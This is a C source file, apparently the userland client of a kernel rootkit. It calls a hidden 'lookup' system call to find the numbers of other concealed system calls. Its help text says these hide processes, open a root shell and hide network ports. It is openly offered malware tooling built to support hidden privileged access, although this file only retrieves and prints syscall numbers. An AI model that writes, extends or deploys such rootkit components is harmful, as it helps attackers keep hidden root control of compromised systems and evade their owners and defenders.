#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <stdlib.h>
#include <unistd.h>
#include "shadow_sysent.h"

int main(int argc, char **argv) {
   int lookup_flag = 0;
   int deepbg_flag = 0;
   int stash_flag = 0;
   int knighted_flag = 0;
   int whisper_flag = 0;
   int help_flag = 0;
   int opt;
   int syscall_num = 210;
   int index = 0;
   int error = -1;
   int ret_val = -1;

   while ((opt = getopt(argc, argv, "aldskwh")) != -1) {
      switch (opt) {
         case 'a':
            lookup_flag = 1;
            deepbg_flag = 1;
            stash_flag = 1;
            knighted_flag = 1;
            whisper_flag = 1;
	    break;
         case 'l':
            lookup_flag=1;
	    break;
	 case 'd':
	    deepbg_flag=1;
	    break;
	 case 's':
	    stash_flag=1;
	    break;
	 case 'k':
	    knighted_flag=1;
	    break;
	 case 'w':
	    whisper_flag=1;
	    break;
	 case 'h':
	    help_flag=1;
	    break;
	 default :
	    help_flag=1;
      }
   }

   if (argc == 1) {
      lookup_flag = 1;
      deepbg_flag = 1;
      stash_flag = 1;
      knighted_flag = 1;
      whisper_flag = 1;
   }

   if (help_flag) {
      printf("%s [OPTIONS] [LOOKUP SYSCALL NUMBER]\n", argv[0]);
      printf("   -l   lookup   Look up syscall numbers of other shadow system calls\n");
      printf("   -d   deepbg   Get syscall number of process hiding system call\n");
      printf("   -k   knighted Get syscall number of rootshell system call\n");
      printf("   -w   whisper  Get syscall number of port hiding system call\n");
      printf("   -h   help     Explain options\n");
      printf("\n");
      printf("   [LOOKUP SYSCALL NUMBER] optional lookup syscall number\n");
      exit(0);
   }

   if (optind < argc) {
      syscall_num = atoi(argv[optind]);
   }

   if (lookup_flag) {
      index = LOOKUP_INDEX;
      error = syscall(syscall_num, index, &ret_val);

      if (error != 0 || ret_val < 0) {
         fprintf(stderr, "[x] Failed to get lookup system call\n");
	 exit(-1);
      } else {
         printf("[-] lookup syscall number   = %d\n", ret_val);
      }
   }

   if (deepbg_flag) {
      index = DEEPBG_INDEX;
      error = syscall(syscall_num, index, &ret_val);

      if (error != 0 || ret_val < 0) {
         fprintf(stderr, "[x] Failed to get deepbg system call\n");
      } else {
         printf("[-] deepbg syscall number   = %d\n", ret_val);
      }
   }

   if (knighted_flag) {
      index = KNIGHTED_INDEX;
      error = syscall(syscall_num, index, &ret_val);

      if (error != 0 || ret_val < 0) {
         fprintf(stderr, "[x] Failed to get knighted system call\n");
      } else {
         printf("[-] knighted syscall number = %d\n", ret_val);
      }
   }

   if (whisper_flag) {
      index = WHISPER_INDEX;
      error = syscall(syscall_num, index, &ret_val);

      if (error != 0 || ret_val < 0) {
         fprintf(stderr, "[x] Failed to get whisper system call\n");
      } else {
         printf("[-] whisper syscall number  = %d\n", ret_val);
      }
   }

   exit(0);
}
